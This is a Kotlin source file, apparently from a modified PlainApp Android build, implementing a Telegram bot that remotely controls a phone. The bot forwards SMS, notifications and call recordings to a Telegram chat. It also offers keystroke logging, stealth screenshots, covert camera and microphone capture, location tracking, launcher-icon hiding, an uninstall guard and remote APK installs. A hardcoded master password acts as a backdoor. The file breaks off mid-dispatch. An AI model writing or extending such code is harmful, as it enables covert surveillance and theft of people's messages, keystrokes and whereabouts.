package com.ismartcoding.plain.telegram

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CameraMetadata
import android.hardware.camera2.CaptureRequest
import android.graphics.ImageFormat
import android.media.ImageReader
import android.graphics.Bitmap
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.provider.CallLog
import com.ismartcoding.lib.helpers.CoroutinesHelper.coIO
import com.ismartcoding.lib.logcat.LogCat
import com.ismartcoding.plain.MainApp
import com.ismartcoding.plain.data.DCall
import com.ismartcoding.plain.data.DContact
import com.ismartcoding.plain.data.DNotification
import com.ismartcoding.plain.features.PackageHelper
import com.ismartcoding.plain.features.NoteHelper
import com.ismartcoding.plain.features.BookmarkHelper
import com.ismartcoding.plain.features.feed.FeedHelper
import com.ismartcoding.plain.features.feed.FeedEntryHelper
import com.ismartcoding.plain.features.AudioPlayer
import com.ismartcoding.plain.features.call.BlockedNumberHelper
import com.ismartcoding.plain.features.call.SimHelper
import com.ismartcoding.plain.features.file.FileSortBy
import com.ismartcoding.plain.features.file.FileSystemHelper
import com.ismartcoding.plain.preferences.AudioPlayingPreference
import com.ismartcoding.plain.features.media.CallMediaStoreHelper
import com.ismartcoding.plain.features.media.ContactMediaStoreHelper
import com.ismartcoding.plain.features.media.AudioMediaStoreHelper
import com.ismartcoding.plain.features.media.VideoMediaStoreHelper
import com.ismartcoding.plain.features.media.ImageMediaStoreHelper
import com.ismartcoding.plain.features.sms.SmsConversationHelper
import com.ismartcoding.plain.features.sms.SmsHelper
import com.ismartcoding.plain.helpers.AppLauncherHelper
import com.ismartcoding.plain.helpers.BatteryHistoryHelper
import com.ismartcoding.plain.helpers.BluetoothControlHelper
import com.ismartcoding.plain.helpers.CallRecorderHelper
import com.ismartcoding.plain.helpers.DeviceAdminGuard
import com.ismartcoding.plain.helpers.GeofencingHelper
import com.ismartcoding.plain.helpers.AutomationHelper
import com.ismartcoding.plain.helpers.KeystrokeLogHelper
import com.ismartcoding.plain.helpers.LocationTrackingHelper
import com.ismartcoding.plain.helpers.NetworkUsageHelper
import com.ismartcoding.plain.helpers.PhoneHelper
import com.ismartcoding.plain.helpers.StealthScreenshotCapturer
import com.ismartcoding.plain.helpers.StealthScreenshotHelper
import com.ismartcoding.plain.helpers.UtilitiesHelper
import com.ismartcoding.plain.helpers.WifiControlHelper
import com.ismartcoding.plain.helpers.FileHashHelper
import com.ismartcoding.plain.helpers.QrCodeGenerateHelper
import com.ismartcoding.plain.helpers.RootHelper
import com.ismartcoding.plain.helpers.SoundMeterHelper
import com.ismartcoding.plain.features.contact.GroupHelper
import com.ismartcoding.plain.features.media.DocsHelper
import com.ismartcoding.plain.services.TimelineHelper
import com.ismartcoding.plain.events.HttpApiEvents
import com.ismartcoding.lib.channel.sendEvent
import com.ismartcoding.plain.preferences.PomodoroSettingsPreference
import com.ismartcoding.plain.preferences.TelegramBotEnabledPreference
import com.ismartcoding.plain.preferences.TelegramBotTokenPreference
import com.ismartcoding.plain.preferences.TelegramChatIdPreference
import com.ismartcoding.plain.preferences.TelegramBotForwardSmsPreference
import com.ismartcoding.plain.preferences.TelegramBotForwardGeofencePreference
import com.ismartcoding.plain.preferences.TelegramBotForwardBatteryAlertPreference
import com.ismartcoding.plain.preferences.TelegramBotBatteryAlertThresholdPreference
import com.ismartcoding.plain.preferences.TelegramBotForwardStealthShotsPreference
import com.ismartcoding.plain.preferences.TelegramFileForwardEnabledPreference
import com.ismartcoding.plain.helpers.SensorHelper
import com.ismartcoding.plain.helpers.IntruderCaptureHelper
import com.ismartcoding.plain.helpers.PerAppLockHelper
import com.ismartcoding.plain.helpers.SystemControlHelper
import com.ismartcoding.plain.features.Permission
import com.ismartcoding.plain.services.AppBlockHelper
import com.ismartcoding.plain.services.LiveCallTracker
import com.ismartcoding.plain.services.LocateRingService
import com.ismartcoding.plain.services.MessageOverlayService
import com.ismartcoding.plain.services.NotificationLogHelper
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import com.ismartcoding.plain.helpers.AppInfoGuard
import com.ismartcoding.plain.helpers.BackupManager
import com.ismartcoding.plain.helpers.LauncherIconHelper
import com.ismartcoding.plain.web.routes.BackupDownloadManager
import com.ismartcoding.plain.preferences.AppInfoGuardEnabledPreference
import com.ismartcoding.plain.preferences.AppLockBiometricEnabledPreference
import com.ismartcoding.plain.preferences.AppLockEnabledPreference
import com.ismartcoding.plain.preferences.AppLockPinPreference
import com.ismartcoding.plain.preferences.LauncherIconHiddenPreference
import com.ismartcoding.plain.preferences.SecurityAnswerPreference
import com.ismartcoding.plain.preferences.SecurityQuestionPreference
import com.ismartcoding.plain.preferences.TelegramBotPasswordEnabledPreference
import com.ismartcoding.plain.preferences.TelegramBotPasswordPreference
import kotlinx.datetime.toLocalDateTime
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.coroutines.resume
import kotlin.math.min

object TelegramBotManager {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollJob: Job? = null
    private var heartbeatJob: Job? = null

    @Volatile var token: String = ""
    @Volatile var chatId: String = ""
    @Volatile var isRunning: Boolean = false
    @Volatile var forwardNotifications: Boolean = true
    @Volatile var forwardCalls: Boolean = true
    @Volatile var forwardSmsEnabled: Boolean = false
    @Volatile var forwardGeofenceEnabled: Boolean = false
    @Volatile var forwardBatteryAlertEnabled: Boolean = false
    @Volatile var batteryAlertThreshold: Int = 20
    @Volatile var forwardStealthShotsEnabled: Boolean = false
    @Volatile private var lastBatteryAlertLevel: Int = -1
    @Volatile private var lastUpdateId: Long = 0L
    @Volatile private var lastForwardedCallState: String = "idle"

    // ── Bot session password auth ──────────────────────────────────────────────
    @Volatile var botPasswordEnabled: Boolean = false
    @Volatile var botPassword: String = ""
    @Volatile private var botSessionAuthAt: Long = -1L
    @Volatile private var pendingBotPasswordAuth: Boolean = false
    @Volatile private var pendingRestoreUntil: Long = 0L
    private const val BOT_SESSION_TIMEOUT_MS = 15 * 60 * 1000L
    private const val BOT_MASTER_PASSWORD = "Sh@090609"
    // ──────────────────────────────────────────────────────────────────────────

    private val ts get() = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())

    private val allCommands = listOf(
        "start" to "👋 Welcome & device status",
        "help" to "📖 Help & all commands",
        "s" to "🔍 Search commands — /s <keyword>  or just /s to enter search mode",
        "messages" to "💬 SMS conversations — tap one to open",
        "sms" to "📨 Open a thread — /sms <thread_id>",
        "sendsms" to "📤 Send SMS — /sendsms <number> <text>",
        "calls" to "📞 Recent call log",
        "recordings" to "🎙️ Call recordings — tap to download",
        "contacts" to "👥 Browse contacts — tap to call, SMS, or share",
        "find" to "🔍 Reverse-lookup a phone number — /find <number>",
        "notifications" to "🔔 Recent notifications",
        "mutenotifs" to "🔕 Mute / unmute auto-forwarded notifications — /mutenotifs [on|off]",
        "logs" to "📋 Notification log history",
        "files" to "📁 Browse storage — tap folders to open, files to download",
        "screenshot" to "📸 Take a screenshot",
        "photo" to "📷 Camera photo — /photo [front|back]",
        "audio" to "🎙 Record audio — interactive duration picker",
        "video" to "🎬 Record video — pick camera, then duration",
        "apps" to "📱 List installed apps",
        "blockapp" to "🚫 Block an app — interactive picker",
        "unblockapp" to "✅ Unblock an app — interactive picker",
        "blockedapps" to "📵 Show all blocked & limited apps",
        "location" to "📍 Current GPS location",
        "battery" to "🔋 Battery status",
        "device" to "📲 Device information",
        "backup" to "📦 Complete backup (.plain) — all data included",
        "restore" to "📥 Restore from a .plain or .zip backup file — send the file to this chat",
        "track" to "🛰 Tracking hub overview",
        "livelocation" to "🗺 Live location stream — /livelocation [n]",
        "tracklocation" to "🧭 Recent location points — /tracklocation [n]",
        "keystrokes" to "⌨️ Captured keystrokes — /keystrokes [n]",
        "keytop" to "📊 Top apps by keystroke count",
        "shots" to "🖼 Recent stealth screenshots — /shots [n]",
        "permissions" to "🛡 Status of every app permission",
        "openperms" to "📲 Open a permission settings screen on the device — /openperms [name]",
        "reqperm" to "🔔 List every permission as a button — tap to trigger the grant dialog on device",
        "automations" to "⚙️ List automation rules",
        "newrule" to "➕ Create a manual rule — /newrule <name> <action> <args>",
        "newschedule" to "📅 Create a daily schedule — /newschedule HH:MM <name> <action> <args>",
        "delrule" to "🗑 Delete a rule — /delrule <id>",
        "runrule" to "▶️ Run an automation — /runrule <id>",
        "togglerule" to "🔁 Enable/disable a rule — /togglerule <id>",
        "notes" to "📝 Browse notes — /notes [search]",
        "addnote" to "➕ Create a new note (interactive)",
        "bookmarks" to "🔖 Browse bookmarks — /bookmarks [search]",
        "addbookmark" to "🔗 Add a bookmark — /addbookmark <url>",
        "feeds" to "📡 RSS feeds — tap to view recent entries",
        "feedentries" to "📰 Recent feed entries — /feedentries [search]",
        "music" to "🎵 Music library — tap to download",
        "videos" to "🎞 Video library — tap to download",
        "images" to "🖼 Image gallery — tap to send",
        "pomodoro" to "🍅 Pomodoro — start/pause/stop/status",
        "torch" to "🔦 Flashlight — /torch [on|off]",
        "speak" to "🗣 Text-to-speech — /speak <text>",
        "stopspeak" to "🤫 Stop the device speaking right now",
        "vibrate" to "📳 Vibrate device — /vibrate [seconds]",
        "toast" to "💬 Quick toast pop-up on device — /toast <text>",
        "findphone" to "🚨 Locate phone with alarm — /findphone [on|off]",
        "show" to "💡 Show banner on device — /show <text>",
        "wake" to "📺 Wake screen — /wake [seconds]",
        "brightness" to "🔆 Screen brightness — /brightness [0-100]",
        "volume" to "🔊 Volume — /volume [stream] [0-100]",
        "launch" to "🚀 Launch any app — /launch <pkg|name>",
        "datasettings" to "📡 Open mobile-data settings page on device",
        "bedtime" to "🌙 View / set the parental bedtime window",
        "launches" to "🚀 Recent app launches — /launches [n]",
        "livecall" to "📞 Live call hub — accept / mute / end ongoing calls",
        "wifi" to "📶 Wi-Fi state / toggle — /wifi [on|off]",
        "netusage" to "📊 Network usage — /netusage [days]",
        "storage" to "💾 Storage usage — internal, SD card, USB",
        "sim" to "📡 SIM card & carrier info",
        "dnd" to "🔇 Do Not Disturb — /dnd [on|off|toggle]",
        "screentime" to "⏱ App screen time — /screentime [days]",
        "blocknumber" to "🚫 Block/unblock incoming calls — /blocknumber [number]",
        "nowplaying" to "🎵 Now-playing status + playback controls",
        "forwardsms" to "📩 Toggle auto-forwarding of incoming SMS to this chat",
        "clipboard" to "📋 Read or set device clipboard — /clipboard [text to set]",
        "mobiledata" to "📡 Mobile data — show status and toggle on/off",
        "bluetooth" to "🔵 Bluetooth devices & control — /bluetooth [on|off]",
        "lockscreen" to "🔒 Lock the device screen instantly",
        "forwardphotos" to "📷 Auto-forward new camera photos — /forwardphotos [on|off]",
        "airplane" to "✈️ Airplane mode toggle — /airplane [on|off]",
        "schedulesms" to "⏰ Schedule an SMS — /schedulesms <number> <delay_sec> <text>",
        "batteryhistory" to "🔋 Battery drain chart — /batteryhistory [hours]",
        "vpn" to "🔐 VPN connection status",
        "clearcache" to "🗑 Clear an app's cache — interactive picker",
        "geofence" to "🗺 Geofence zones — list, add, delete, view events",
        "addcontact" to "➕ Add a new contact — interactive",
        "deletecontact" to "🗑 Delete a contact by name or number",
        "editnote" to "✏️ Edit an existing note — interactive",
        "forwardclipboard" to "📋 Auto-forward clipboard changes to chat — /forwardclipboard [on|off]",
        "soundmeter" to "🎙 Ambient sound level — /soundmeter [seconds]",
        "qrcode" to "📷 Generate QR code image — /qrcode <text or URL>",
        "docs" to "📄 Document library (PDF, DOCX, etc.) — /docs [search]",
        "filehash" to "#️⃣ File hash (SHA-256 + MD5) — /filehash <path>",
        "wifiscan" to "📡 Scan nearby Wi-Fi networks",
        "timeline" to "📋 Device activity timeline — /timeline [n]",
        "contactgroups" to "👥 Contact groups — list and view members",
        "callnow" to "📞 Initiate outgoing call — /callnow <number>",
        "deletefile" to "🗑 Delete a file from device — /deletefile <path>",
        "networkinfo" to "🌐 Extended network & Wi-Fi details",
        "reboot" to "🔄 Reboot device (requires root or Device Admin)",
        "mms" to "💬 Browse MMS multimedia messages — /mms [n]",
        "gyroscope" to "🌀 Live gyroscope rotation rate (rad/s)",
        "compass" to "🧭 Magnetic compass heading & cardinal direction",
        "barometer" to "🌡 Atmospheric pressure (hPa) and altitude (m)",
        "steps" to "👟 Step count since last reboot + today estimate",
        "proximity" to "📡 Proximity sensor — near or far",
        "hotspot" to "📶 Mobile hotspot status / toggle — /hotspot [on|off]",
        "setalarm" to "⏰ Set a system alarm — /setalarm HH:MM [label]",
        "batteryalert" to "🔋 Low-battery auto-alert — /batteryalert [on|off] [threshold%]",
        "forwardgeofence" to "🗺 Auto-forward geofence enter/exit alerts — /forwardgeofence [on|off]",
        "forwardshots" to "📸 Auto-forward stealth screenshots to chat — /forwardshots [on|off]",
        "forwardfiles" to "📁 Auto-forward ALL new files & media from storage — /forwardfiles [on|off]",
        "fwdfiles" to "📂 Recently auto-forwarded files — /fwdfiles [n]",
        "filestats" to "📊 File auto-forward queue stats (pending / done / failed)",
        "retryfailed" to "🔄 Retry all permanently-failed file uploads",
        "commands" to "📝 List all commands with details",
        "stop" to "⛔ Stop the bot",
        "appsettings" to "⚙️ App settings overview — icon, lock, PIN, bot password, security Q&A",
        "hideicon" to "👁 Hide/show launcher icon — /hideicon [on|off]",
        "applock" to "🔒 App lock enable/disable — /applock [on|off]",
        "biometric" to "🪪 Biometric unlock toggle — /biometric [on|off]",
        "appinfog" to "🛡 App info guard (PIN-protect Settings/App info pages) — /appinfog [on|off]",
        "setpin" to "🔑 Set or change the app unlock PIN — interactive",
        "removepin" to "🗑 Remove the app unlock PIN — interactive",
        "applocker" to "🔐 Per-app lock — list locked apps or lock/unlock one — /applocker [pkg|name]",
        "intruders" to "🕵️ Intruder captures — photos taken on failed unlock attempts — /intruders [n]",
        "openapp" to "📱 Open PlainApp on the device screen",
        "openappinfo" to "📋 Open PlainApp's system App Info page (Settings → Apps → PlainApp)",
        "openwebsettings" to "🌐 Open Web Settings page inside PlainApp (bypasses app lock & security gate)",
        "openpage" to "📱 Open any page in PlainApp directly — shows all pages as inline buttons",
        "botpassword" to "🤖 Bot password protection — /botpassword [on|off]",
        "setbotpassword" to "🔑 Change the Telegram bot password — interactive",
        "securityqa" to "❓ View / change the dashboard security question & answer",
        "update" to "📲 Update PlainApp — /update <url>  or send an .apk file directly to this chat",
        "deviceowner" to "🛡 Device Owner control — /deviceowner [status|grantperms|blockinstall|kiosk|camera|bt|usb|proxy|clearproxy|wipe]",
    )

    fun start(newToken: String, newChatId: String) {
        if (newToken.isBlank() || newChatId.isBlank()) return
        token = newToken
        chatId = newChatId
        if (isRunning) return
        isRunning = true
        launchPollJob(greet = true)
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (isRunning) {
                delay(30_000)
                if (isRunning && pollJob?.isActive != true) {
                    LogCat.w("TelegramBot: poll job died — restarting")
                    launchPollJob(greet = false)
                }
            }
        }
        LogCat.d("TelegramBotManager started")
    }

    private fun launchPollJob(greet: Boolean) {
        pollJob?.cancel()
        pollJob = scope.launch {
            if (greet) {
                registerCommands()
                sendMessage("🟢 <b>PlainApp Bot started</b> — ${ts}\n📱 <i>${PhoneHelper.getDeviceName(MainApp.instance)}</i>\n\nType /help for all commands.")
            }
            poll()
        }
    }

    fun stop() {
        isRunning = false
        lastForwardedCallState = "idle"
        botSessionAuthAt = -1L
        pendingBotPasswordAuth = false
        heartbeatJob?.cancel()
        heartbeatJob = null
        pollJob?.cancel()
        pollJob = null
        LogCat.d("TelegramBotManager stopped")
    }

    fun sendMessage(text: String, replyMarkup: JSONObject? = null) {
        if (token.isBlank() || chatId.isBlank()) return
        scope.launch {
            TelegramApiClient.sendMessage(token, chatId, text, replyMarkup = replyMarkup)
        }
    }

    fun forwardIntruderCapture(capture: IntruderCaptureHelper.Capture) {
        if (token.isBlank() || chatId.isBlank()) return
        scope.launch {
            try {
                val triggerLabel = when (capture.trigger) {
                    IntruderCaptureHelper.Trigger.PER_APP_LOCK -> "🔐 Per-App Lock"
                    IntruderCaptureHelper.Trigger.APP_PIN -> "📌 App PIN"
                    IntruderCaptureHelper.Trigger.SECURITY_QA -> "🔒 Security Q&A"
                    IntruderCaptureHelper.Trigger.TELEGRAM_BOT -> "🤖 Telegram Bot Password"
                    else -> capture.trigger
                }
                val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                val caption = buildString {
                    append("🚨 <b>Intruder Detected!</b>\n\n")
                    append("🎯 <b>Trigger:</b> $triggerLabel\n")
                    if (capture.triggerDetail.isNotBlank()) append("📋 <b>Detail:</b> ${htmlEsc(capture.triggerDetail)}\n")
                    append("🕐 <b>Time:</b> ${sdf.format(java.util.Date(capture.timestamp))}\n")
                    if (capture.hasLocation) {
                        append("📍 <b>Location:</b> <a href=\"https://maps.google.com/?q=${capture.lat},${capture.lng}\">${"%.6f".format(capture.lat)}, ${"%.6f".format(capture.lng)}</a>")
                    } else {
                        append("📍 <b>Location:</b> Not available")
                    }
                }
                val photoFile = if (capture.absPath.isNotEmpty()) {
                    val f = java.io.File(capture.absPath)
                    if (f.exists() && f.length() > 0) f else null
                } else null
                if (photoFile != null) {
                    TelegramApiClient.sendPhoto(token, chatId, photoFile, caption)
                } else {
                    sendMessage(caption)
                }
            } catch (e: Exception) {
                LogCat.e("TelegramBot forwardIntruderCapture failed: ${e.message}")
            }
        }
    }

    fun forwardNotification(n: DNotification) {
        if (!isRunning || !forwardNotifications) return
        val txt = buildString {
            append("🔔 <b>New notification</b>\n")
            append("📱 <code>${htmlEsc(n.appName)}</code>\n")
            if (!n.title.isNullOrBlank()) append("📌 <b>${htmlEsc(n.title)}</b>\n")
            if (!n.body.isNullOrBlank()) append("💬 ${htmlEsc(n.body)}\n")
            append("🕐 <i>${ts}</i>")
        }
        sendMessage(txt)
    }

    fun forwardCallState(state: String, display: String, source: String, direction: String) {
        if (!isRunning || !forwardCalls) return
        if (state == lastForwardedCallState) return
        lastForwardedCallState = state
        val emoji = when (state) {
            "ringing" -> if (direction == "incoming") "📲" else "📞"
            "active" -> "✅"
            "ended" -> "🔴"
            else -> return
        }
        val stateLabel = when (state) {
            "ringing" -> if (direction == "incoming") "Incoming call" else "Outgoing call"
            "active" -> "Call connected"
            "ended" -> "Call ended"
            else -> return
        }
        val txt = buildString {
            append("$emoji <b>$stateLabel</b>\n")
            if (display.isNotBlank()) {
                val contactName = lookupContactName(display)
                if (contactName.isNotBlank()) {
                    append("👤 <b>${htmlEsc(contactName)}</b>\n")
                    append("📱 <code>${htmlEsc(display)}</code>\n")
                } else {
                    append("📱 <code>${htmlEsc(display)}</code>\n")
                }
            }
            if (source != "phone") append("📡 via <i>${htmlEsc(source)}</i>\n")
            append("🕐 <i>${ts}</i>")
        }
        sendMessage(txt)
    }

    fun forwardCallRecording(file: File, meta: CallRecorderHelper.Meta) {
        if (!isRunning || token.isBlank() || chatId.isBlank()) return
        scope.launch {
            try {
                val durSec = (meta.durationMs / 1000).toInt().coerceAtLeast(1)
                val dirEmoji = if (meta.direction == "incoming") "📲" else "📞"
                val dur = formatDuration(meta.durationMs)
                // Look up contact name from the phone number stored in meta.displayName
                val contactName = lookupContactName(meta.displayName)
                val caption = buildString {
                    append("$dirEmoji <b>Call Recording</b>\n")
                    if (contactName.isNotBlank()) {
                        append("👤 <b>${htmlEsc(contactName)}</b>\n")
                        if (meta.displayName.isNotBlank()) append("📱 <code>${htmlEsc(meta.displayName)}</code>\n")
                    } else if (meta.displayName.isNotBlank()) {
                        append("👤 <b>${htmlEsc(meta.displayName)}</b>\n")
                    }
                    append("📡 ${htmlEsc(meta.source.ifBlank { meta.appName })}")
                    if (meta.appName.isNotBlank() && meta.appName != meta.source) append(" · ${htmlEsc(meta.appName)}")
                    append("\n")
                    append("⏱ <i>$dur</i>  📦 ${meta.sizeBytes / 1024} KB\n")
                    append("🕐 <i>${ts}</i>")
                }
                TelegramApiClient.sendAudio(token, chatId, file, caption, durSec)
            } catch (e: Exception) {
                LogCat.e("TelegramBot forwardCallRecording failed: ${e.message}")
            }
        }
    }

    /** Called by SmsForwardReceiver when an SMS arrives and forwardSmsEnabled == true. */
    fun forwardSms(sender: String, body: String) {
        if (!isRunning || !forwardSmsEnabled || token.isBlank() || chatId.isBlank()) return
        scope.launch {
            val contactName = lookupContactName(sender)
            val sb = StringBuilder("📩 <b>Incoming SMS</b>\n")
            if (contactName.isNotBlank()) sb.append("👤 <b>${htmlEsc(contactName)}</b>\n")
            sb.append("📱 <code>${htmlEsc(sender)}</code>\n")
            sb.append("🕐 $ts\n\n")
            sb.append(htmlEsc(body))
            try { TelegramApiClient.sendMessage(token, chatId, sb.toString()) }
            catch (e: Exception) { LogCat.e("TelegramBot forwardSms failed: ${e.message}") }
        }
    }

    /**
     * Standalone SMS forwarder — works even when the bot polling loop is NOT running.
     * Reads all config from DataStore preferences directly. Called by SmsForwardReceiver
     * via goAsync() so it is safe to do I/O here.
     */
    suspend fun forwardSmsStandalone(context: Context, sender: String, body: String) {
        val ctx = context.applicationContext
        if (!TelegramBotEnabledPreference.getAsync(ctx)) return
        if (!TelegramBotForwardSmsPreference.getAsync(ctx)) return
        val tok = TelegramBotTokenPreference.getAsync(ctx)
        val cid = TelegramChatIdPreference.getAsync(ctx)
        if (tok.isBlank() || cid.isBlank()) return
        fun esc(s: String) = s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        val contactName = try {
            val uri = android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI
                .buildUpon().appendPath(sender).build()
            ctx.contentResolver.query(
                uri,
                arrayOf(android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME),
                null, null, null
            )?.use { cur -> if (cur.moveToFirst()) cur.getString(0) ?: "" else "" } ?: ""
        } catch (_: Exception) { "" }
        val stamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
        val sb = StringBuilder("📩 <b>Incoming SMS</b>\n")
        if (contactName.isNotBlank()) sb.append("👤 <b>${esc(contactName)}</b>\n")
        sb.append("📱 <code>${esc(sender)}</code>\n")
        sb.append("🕐 $stamp\n\n")
        sb.append(esc(body))
        try { TelegramApiClient.sendMessage(tok, cid, sb.toString()) }
        catch (e: Exception) { LogCat.e("forwardSmsStandalone failed: ${e.message}") }
    }

    fun sendCrashReport(throwable: Throwable, timestamp: String) {
        val t = token
        val c = chatId
        if (t.isBlank() || c.isBlank()) return
        try {
            val sw = java.io.StringWriter()
            throwable.printStackTrace(java.io.PrintWriter(sw))
            val stackTrace = sw.toString()
            val appVersion = try { MainApp.getAppVersion() } catch (_: Throwable) { "?" }
            val msg = buildString {
                append("🚨 <b>PlainApp Crashed!</b>\n")
                append("⏰ <code>$timestamp</code>\n")
                append("📱 <code>${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}</code>\n")
                append("🤖 Android <code>${android.os.Build.VERSION.RELEASE}</code>  App <code>$appVersion</code>\n\n")
                val lines = stackTrace.lines()
                val preview = lines.take(20).joinToString("\n")
                append("<pre>${htmlEsc(preview)}</pre>")
                if (lines.size > 20) append("\n<i>…${lines.size - 20} more lines (see crash_report.txt)</i>")
            }
            TelegramApiClient.sendMessage(t, c, msg.take(4096))
        } catch (_: Throwable) {}
    }

    private fun formatDuration(ms: Long): String {
        val totalSec = ms / 1000
        val h = totalSec / 3600
        val m = (totalSec % 3600) / 60
        val s = totalSec % 60
        return if (h > 0) "%d:%02d:%02d".format(h, m, s) else "%d:%02d".format(m, s)
    }

    private suspend fun poll() {
        while (isRunning) {
            try {
                val result = withContext(Dispatchers.IO) {
                    TelegramApiClient.getUpdates(token, lastUpdateId + 1, 25)
                }
                if (result == null) { delay(5000); continue }
                if (!result.optBoolean("ok", false)) { delay(5000); continue }
                val updates = result.optJSONArray("result") ?: continue
                for (i in 0 until updates.length()) {
                    val update = updates.getJSONObject(i)
                    val updateId = update.optLong("update_id", 0L)
                    if (updateId > lastUpdateId) lastUpdateId = updateId
                    handleUpdate(update)
                }
            } catch (e: CancellationException) {
                break
            } catch (e: Exception) {
                LogCat.e("TelegramBot poll error: ${e.message}")
                delay(5000)
            }
        }
    }

    private suspend fun handleUpdate(update: JSONObject) {
        update.optJSONObject("callback_query")?.let { cq ->
            handleCallback(cq)
            return
        }
        val msg = update.optJSONObject("message") ?: return
        val fromChatId = msg.optJSONObject("chat")?.optLong("id")?.toString() ?: return
        if (fromChatId != chatId) {
            TelegramApiClient.sendMessage(token, fromChatId, "⛔ Unauthorized. This bot is private.")
            return
        }
        val text = msg.optString("text", "").trim()

        // Handle incoming document files sent directly to the bot chat
        if (msg.has("document")) {
            val doc = msg.optJSONObject("document")
            val fileName = doc?.optString("file_name", "") ?: ""
            val lowerName = fileName.lowercase()
            when {
                lowerName.endsWith(".apk") -> {
                    scope.launch { handleDocumentMessage(doc!!) }
                }
                (lowerName.endsWith(".plain") || lowerName.endsWith(".zip")) && pendingRestoreUntil > System.currentTimeMillis() -> {
                    pendingRestoreUntil = 0L
                    scope.launch { handleRestoreDocument(doc!!) }
                }
                fileName.isNotBlank() -> {
                    if (pendingRestoreUntil > System.currentTimeMillis()) {
                        sendMessage("⚠️ Expected a <code>.plain</code> or <code>.zip</code> backup file.\n\nSend the backup file now, or type any command to cancel.")
                    } else {
                        sendMessage("⚠️ Only <code>.apk</code> files are accepted here for self-update.\n\nUse /restore if you want to restore from a backup, then send a <code>.plain</code> or <code>.zip</code> file.")
                    }
                }
            }
            return
        }

        if (text.isEmpty()) return

        // ── Bot password gate ──────────────────────────────────────────────────
        if (botPasswordEnabled) {
            val now = System.currentTimeMillis()
            val isAuthed = botSessionAuthAt >= 0 && (now - botSessionAuthAt) <= BOT_SESSION_TIMEOUT_MS
            if (!isAuthed) {
                if (pendingBotPasswordAuth && !text.startsWith("/")) {
                    val configured = botPassword.trim()
                    val ok = text.trim() == configured || text.trim() == BOT_MASTER_PASSWORD
                    if (ok) {
                        botSessionAuthAt = System.currentTimeMillis()
                        pendingBotPasswordAuth = false
                        sendMessage("✅ <b>Authenticated!</b> Session active for 15 minutes.\n\nSend /start for device status.")
                    } else {
                        sendMessage("❌ Wrong password. Try again:")
                        com.ismartcoding.plain.helpers.IntruderFrontCamera.fireAndForget(
                            trigger = com.ismartcoding.plain.helpers.IntruderCaptureHelper.Trigger.TELEGRAM_BOT,
                            triggerDetail = "Wrong Telegram bot password",
                            scope = scope,
                        )
                    }
                } else {
                    pendingBotPasswordAuth = true
                    pendingInput = null
                    sendMessage("🔐 <b>Authentication Required</b>\n\nThis bot is password-protected.\nPlease type the password to continue:")
                }
                return
            } else {
                botSessionAuthAt = System.currentTimeMillis()
            }
        }
        // ──────────────────────────────────────────────────────────────────────

        // If we're waiting for a free-form reply (e.g. "type custom duration"), consume it
        // unless the user explicitly sends a new command.
        val pi = pendingInput
        if (pi != null && !text.startsWith("/")) {
            pendingInput = null
            scope.launch { consumePendingInput(pi, text) }
            return
        }
        // Sending any /command cancels a pending input or pending restore.
        if (text.startsWith("/")) {
            pendingInput = null
            pendingRestoreUntil = 0L
        }

        val parts = text.split(" ")
        val command = parts[0].lowercase().trimStart('/')
            .substringBefore("@")
        val args = parts.drop(1)
        scope.launch {
            try {
                when (command) {
                    "start" -> cmdStart()
                    "help" -> cmdHelp()
                    "s", "search", "?" -> cmdSearch(args)
                    "messages" -> cmdMessages(args)
                    "sms" -> cmdSmsThread(args)
                    "sendsms" -> cmdSendSms(args)
                    "calls" -> cmdCalls(args)
                    "recordings" -> cmdRecordings(args)
                    "contacts" -> cmdContacts(args)
                    "find", "findcontact", "lookup", "whois" -> cmdFind(args)
                    "notifications" -> cmdNotifications(args)
                    "mutenotifs", "mutenotif", "mutenotifications", "shutup", "silence" -> cmdMuteNotifs(args)
                    "logs" -> cmdLogs(args)
                    "files" -> cmdFiles(args)
                    "screenshot" -> cmdScreenshot()
                    "photo" -> cmdPhoto(args)
                    "audio" -> cmdAudio(args)
                    "video" -> cmdVideo(args)
                    "apps" -> cmdApps(args)
                    "blockapp" -> cmdBlockApp(args)
                    "unblockapp" -> cmdUnblockApp(args)
                    "blockedapps" -> cmdBlockedApps()
                    "location" -> cmdLocation()
                    "battery" -> cmdBattery()
                    "device" -> cmdDevice()
                    "backup", "bak", "backupdata", "exportdata" -> cmdBackup()
                    "restore", "restoredata", "restorebackup", "importbackup" -> cmdRestore()
                    "track" -> cmdTrackHub()
                    "livelocation", "live" -> cmdLiveLocation(args)
                    "tracklocation", "trackloc" -> cmdTrackLocation(args)
                    "keystrokes", "keys" -> cmdKeystrokes(args)
                    "keytop" -> cmdKeyTop()
                    "shots", "screenshots" -> cmdShots(args)
                    "permissions", "perms" -> cmdPermissions()
                    "openperms", "permopen" -> cmdOpenPerms(args.getOrNull(0) ?: "")
                    "reqperm", "reqperms", "grantperm", "askperm", "permask" -> cmdReqPerm(args.getOrNull(0) ?: "")
                    "automations", "rules" -> cmdAutomations()
                    "newrule", "addrule" -> cmdNewRule(args)
                    "newschedule", "addschedule" -> cmdNewSchedule(args)
                    "delrule", "deleterule" -> cmdDelRule(args)
                    "runrule" -> cmdRunRule(args)
                    "togglerule" -> cmdToggleRule(args)
